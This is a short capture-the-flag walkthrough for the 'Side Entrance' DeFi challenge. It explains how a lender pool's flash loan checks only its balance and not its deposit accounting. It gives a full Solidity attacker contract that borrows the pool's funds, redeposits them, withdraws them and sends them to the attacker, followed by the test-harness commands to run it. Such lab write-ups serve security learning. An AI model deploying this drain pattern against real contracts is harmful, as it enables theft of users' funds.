# Side Entrance

**HINT:** Take a deeper look at how the accounting system works in the lender pool.

<details>
<summary>Part 1</summary>
<p>

The lender pool forgets to use its accounting system and only checks to see if the token balance has lowered. This contract essentially takes a flash loan and redeposits the funds leaving us with the same balance. All checks, according to the lender pool, are then passed leaving us the ability to then call the ```withdraw()``` function.
```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    using SafeMath for uint256;

    ISideEntranceLenderPool _pool;
    uint256 _poolBalance;
    address payable _attackerEOA;

    constructor() public {}

    function attack(ISideEntranceLenderPool pool, address payable attackerEOA) public {
        _pool = pool;
        _attackerEOA = attackerEOA;
        _poolBalance = address(_pool).balance;

        _pool.flashLoan(_poolBalance);

        _pool.withdraw();
        _attackerEOA.transfer(_poolBalance);
    }
    
    function execute() external payable {
        _pool.deposit{value: _poolBalance}();
    }

    receive() external payable {}
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Now go to ```side-entrance.challenge.js``` and at the top of the file add:
```js
const SideEntranceAttacker = contract.fromArtifact("SideEntranceAttacker");
```
And at ```Exploit``` add:
```js
this.attacker = await SideEntranceAttacker.new({ from: attacker });
await this.attacker.attack(this.pool.address, attacker);
```

```sh
npm run side-entrance.challenge.js
```

</p>
</details>